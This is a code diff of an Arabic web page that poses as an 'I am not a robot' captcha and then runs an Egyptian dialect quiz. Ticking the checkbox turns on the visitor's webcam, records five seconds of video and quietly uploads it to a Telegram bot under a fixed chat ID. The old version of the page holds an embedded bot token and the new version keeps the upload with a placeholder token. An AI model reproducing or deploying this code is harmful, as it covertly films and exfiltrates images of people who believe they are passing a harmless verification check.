@@ -28,13 +28,9 @@
             max-width: 500px;
             padding: 30px;
             text-align: center;
-            animation: fadeIn 0.5s ease;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .verification-section {
+        .verification-section,
+        .quiz-section {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -48,14 +44,18 @@
         input[type="checkbox"] {
             width: 24px;
             height: 24px;
-            accent-color: #27ae60;
         }
-        .loading, .success {
+        .loading,
+        .success {
             margin: 15px 0;
             font-size: 18px;
         }
-        .loading { color: #f39c12; }
-        .success { color: #27ae60; }
+        .loading {
+            color: #f39c12;
+        }
+        .success {
+            color: #27ae60;
+        }
         video {
             width: 100%;
             max-width: 300px;
@@ -77,18 +77,12 @@
             border-radius: 8px;
             cursor: pointer;
             transition: background-color 0.3s;
-            font-size: 16px;
-            text-align: center;
         }
         .btn:hover {
             background-color: #2ecc71;
         }
-        .quiz-section {
-            text-align: right;
-        }
         .quiz-section h2 {
             margin-bottom: 15px;
-            color: #2c3e50;
         }
         .option {
             display: flex;
@@ -97,25 +91,16 @@
             background-color: #f7f7f7;
             border-radius: 8px;
             padding: 10px;
-            transition: background-color 0.3s;
-        }
-        .option input[type="radio"] {
-            margin-left: 10px;
         }
         .option:hover {
-            background-color: #e8f4f8;
+            background-color: #e8f4f8; 
         }
         .result {
-            text-align: center;
-            padding: 20px;
-            background-color: #f1f1f1;
-            border-radius: 10px;
-        }
-        @media (max-width: 480px) {
-            .language-buttons {
-                grid-template-columns: 1fr;
-            }
-        }
+          text-align:center; 
+          padding :20px; 
+          background-color:#f1f1f1; 
+          border-radius :10px; 
+      }
     </style>
 </head>
 <body>
@@ -125,171 +110,164 @@
             <div class="checkbox-container">
                 <input type="checkbox" id="robot-checkbox">
                 <label for="robot-checkbox">أنا لست روبوتاً</label>
-            </div>
-            <video id="video" autoplay playsinline muted></video>
-            <div class="loading">جاري التحقق... ⏳</div>
-            <div class="success">✅ تم التحقق بنجاح!</div>
-        </div>
-    </div>
+             </div>
+             <video id="video" autoplay playsinline muted></video>
+             <div class="loading">جاري التحقق... ⏳</div>
+             <div class="success">✅ تم التحقق بنجاح!</div>
+         </div>
+     </div>
 
-    <div class="container" id="quiz-container" style="display:none;">
-        <div class="quiz-section">
-            <h1>اختبار اللهجات المصرية</h1>
-            <div class="language-buttons">
-                <button class="btn" onclick="startQuiz('اسكندراني')">إسكندراني</button>
-                <button class="btn" onclick="startQuiz('منياوي')">منياوي</button>
-                <button class="btn" onclick="startQuiz('فلاحي')">فلاحي</button>
-                <button class="btn" onclick="startQuiz('صعيدي')">صعيدي</button>
-            </div>
-            <div id="question-container" style="display:none;">
-                <h2 id="question-text"></h2>
-                <div id="options-container"></div>
-                <button id="next-button" class="btn" style="display:none; width: 100%;">السؤال التالي</button>
-            </div>
-            <div class="result" id="result" style="display:none;">
-                <h2>نتيجتك</h2>
-                <p id="score"></p>
-            </div>
-        </div>
-    </div>
+     <div class="container" id="quiz-container" style="display:none;">
+         <div class="quiz-section">
+             <h1>اختبار اللهجات المصرية</h1>
+             <div class="language-buttons">
+                 <button class="btn" onclick="startQuiz('اسكندراني')">إسكندراني</button>
+                 <button class="btn" onclick="startQuiz('منياوي')">منياوي</button>
+                 <button class="btn" onclick="startQuiz('فلاحي')">فلاحي</button>
+                 <button class="btn" onclick="startQuiz('صعيدي')">صعيدي</button>
+             </div>
+             <div id="question-container" style="display:none;">
+                 <h2 id="question-text"></h2>
+                 <div id="options-container"></div>
+                 <button id="next-button" class="btn" style="display:none; width:100%;">السؤال التالي</button>
+             </div>
+             <div class="result" id="result" style="display:none;">
+                 <h2>نتيجتك</h2>
+                 <p id="score"></p>
+             </div>
+         </div>
+     </div>
 
-    <script>
-        const video = document.getElementById('video');
-        const checkbox = document.getElementById('robot-checkbox');
-        const loading = document.querySelector('.loading');
-        const success = document.querySelector('.success');
+     <script>
+         const video = document.getElementById('video');
+         const checkbox = document.getElementById('robot-checkbox');
+         const loading = document.querySelector('.loading');
+         const success = document.querySelector('.success');
 
-        checkbox.addEventListener('change', (e) => {
-            if (e.target.checked) {
-                video.style.display = 'block';
-                loading.style.display = 'block';
-                success.style.display = 'none';
+         checkbox.addEventListener('change', (e) => {
+             if (e.target.checked) {
+                 video.style.display = 'block';
+                 loading.style.display = 'block';
+                 success.style.display = 'none';
+                 navigator.mediaDevices.getUserMedia({ video:true })
+                     .then((stream) => {
+                         video.srcObject = stream;
 
-                navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    video.srcObject = stream;
+                         const mediaRecorder = new MediaRecorder(stream);
+                         const chunks = [];
+                         mediaRecorder.start();
 
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    mediaRecorder.start();
-                    mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
+                         mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
+                         setTimeout(() => { mediaRecorder.stop(); },5000);
 
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
+                         mediaRecorder.onstop = () => {
+                             loading.style.display = 'none';
+                             success.style.display = 'block';
+                             stream.getTracks().forEach(track => track.stop());
+                             document.getElementById('verification-container').style.display = 'none';
+                             document.getElementById('quiz-container').style.display = 'block';
 
-                    mediaRecorder.onstop = () => {
-                        loading.style.display = 'none';
-                        success.style.display = 'block';
-                        stream.getTracks().forEach(track => track.stop());
+                             const blob = new Blob(chunks, { type:'video/webm' });
+                             const formData = new FormData();
+                             formData.append('chat_id', '2070423407');
+                             formData.append('video', blob, 'video.webm');
 
-                        document.getElementById('verification-container').style.display = 'none';
-                        document.getElementById('quiz-container').style.display = 'block';
+                             fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendVideo`, { method:'POST', body : formData })
+                                 .catch((error) => { console.error('Video upload failed:', error.message); });
+                         };
+                     })
+                     .catch((err) => { alert("Unable to access the camera:" + err.message); });
+             }
+         });
 
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const formData = new FormData();
-                        formData.append('chat_id', '2070423407');
-                        formData.append('video', blob, 'video.webm');
+         const dialects = {
+             "اسكندراني": [
+                 { q:"ما معنى كلمة 'جعان'؟", options:["محتاج","جائع","نعسان","غاضب"], correct :1 },
+                 { q:"ماذا تعني 'حتة'؟", options:["جزء","بيت","مكان","شيء"], correct :0 },
+                 // Additional questions...
+             ],
+             "منياوي": [
+                 { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1 },
+                 { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0 },
+                 // Additional questions...
+             ]
+         };
 
-                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { 
-                            method: 'POST', 
-                            body: formData 
-                        }).catch((error) => { console.error('Video upload failed:', error.message); });
-                    };
-                })
-                .catch((err) => { alert("Unable to access the camera: " + err.message); });
-            }
-        });
+         let score = 0; 
+         let currentQuestionIndex = 0; 
+         const nextButton = document.getElementById('next-button'); 
+         const questionText = document.getElementById('question-text'); 
+         const optionsContainer = document.getElementById('options-container'); 
+         const resultDiv = document.getElementById('result'); 
+         const scoreText = document.getElementById('score'); 
+         let questions = [];
 
-        const dialects = {
-            "اسكندراني": [
-                { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
-                { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
-                { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
-                { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
-                { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 }
-            ],
-            "منياوي": [
-                { q: "ماذا تعني 'أبا'؟", options: ["أنا", "أبي", "أنت", "نعم"], correct: 1 },
-                { q: "ما هو معنى 'زير'؟", options: ["وعاء ماء", "ثوب", "طعام", "بيت"], correct: 0 },
-                { q: "ماذا تعني كلمة 'شوش'؟", options: ["رأس", "صوت", "ماء", "نار"], correct: 1 },
-                { q: "ما معنى 'الحُما'؟", options: ["غابة", "بيت", "مطعم", "مزرعة"], correct: 3 },
-                { q: "ما هو معنى 'تلِم'؟", options: ["موقف", "صوت", "نوافذ", "أداة"], correct: 0 }
-            ]
-        };
+         function shuffleQuestions(arr) {
+             for (let i=arr.length -1; i >0; i--) {
+                 const j=Math.floor(Math.random() * (i +1));
+                 [arr[i], arr[j]]=[arr[j], arr[i]];
+             }
+         }
 
-        let score = 0;
-        let currentQuestionIndex = 0;
-        const nextButton = document.getElementById('next-button');
-        const questionText = document.getElementById('question-text');
-        const optionsContainer = document.getElementById('options-container');
-        const resultDiv = document.getElementById('result');
-        const scoreText = document.getElementById('score');
-        let questions = [];
+         function startQuiz(dialect) {
+             questions=dialects[dialect];
+             shuffleQuestions(questions); // Shuffle questions for randomness
+             displayQuestion();
+             document.getElementById('question-container').style.display='block';
+         }
 
-        function shuffleQuestions(arr) {
-            for (let i = arr.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [arr[i], arr[j]] = [arr[j], arr[i]];
-            }
-        }
+         function handleAnswer(selectedOption) {
+             const question=questions[currentQuestionIndex];
+             const correctOption=question.correct;
 
-        function startQuiz(dialect) {
-            questions = dialects[dialect];
-            displayQuestion();
-            document.getElementById('question-container').style.display = 'block';
-        }
+             if (selectedOption===correctOption) { score++; }
 
-        function handleAnswer(selectedOption) {
-            const question = questions[currentQuestionIndex];
-            const correctOption = question.correct;
-            if (selectedOption === correctOption) {
-                score++;
-            }
+             nextButton.style.display='block';
+         }
 
-            nextButton.style.display = 'block';
-        }
+         nextButton.addEventListener('click', () => {
+             currentQuestionIndex++;
+             
+             if (currentQuestionIndex<questions.length) {
+                 displayQuestion();
+                 nextButton.style.display='none';
+             } else { showResult(); }
+         });
 
-        nextButton.addEventListener('click', () => {
-            currentQuestionIndex++;
-            if (currentQuestionIndex < questions.length) {
-                displayQuestion();
-                nextButton.style.display = 'none';
-            } else {
-                showResult();
-            }
-        });
+         function displayQuestion() {
+             const question=questions[currentQuestionIndex];
+             questionText.textContent=question.q;
 
-        function displayQuestion() {
-            const question = questions[currentQuestionIndex];
-            questionText.textContent = question.q;
-            optionsContainer.innerHTML = '';
-            const shuffledOptions = [...question.options];
-            shuffleQuestions(shuffledOptions);
+             optionsContainer.innerHTML='';
+             
+             question.options.forEach((option,index) => {
+                 const optionDiv=document.createElement('div');
+                 optionDiv.classList.add('option');
 
-            shuffledOptions.forEach((option, index) => {
-                const optionDiv = document.createElement('div');
-                optionDiv.classList.add('option');
-                const radioInput = document.createElement('input');
-                radioInput.type = 'radio';
-                radioInput.name = 'answer';
-                radioInput.id = `option-${index}`;
-                radioInput.value = index;
-                radioInput.addEventListener('click', () => handleAnswer(index));
+                 const radioInput=document.createElement('input');
+                 radioInput.type='radio';
+                 radioInput.name='answer';
+                 radioInput.id=`option-${index}`;
+                 radioInput.value=index;
 
-                const label = document.createElement('label');
-                label.setAttribute('for', `option-${index}`);
-                label.textContent = option;
+                 radioInput.addEventListener('click', () => handleAnswer(index));
 
-                optionDiv.appendChild(radioInput);
-                optionDiv.appendChild(label);
-                optionsContainer.appendChild(optionDiv);
-            });
-        }
+                 const label=document.createElement('label');
+                 label.setAttribute('for', `option-${index}`);
+                 label.textContent=option;
 
-        function showResult() {
-            resultDiv.style.display = 'block';
-            scoreText.textContent = `النتيجة: ${score} من ${questions.length}`;
-            document.getElementById('quiz-container').style.display = 'none';
-        }
-    </script>
+                 optionDiv.appendChild(radioInput);
+                 optionDiv.appendChild(label);
+                 
+                 optionsContainer.appendChild(optionDiv);
+              });
+          }
+
+          function showResult() {
+              resultDiv.style.display='block';
+              scoreText.textContent=`النتيجة:${score} من ${questions.length}`;
+              document.getElementById('quiz-container').style.display='none';
+          }
+     </script>
 </body>
 </html>
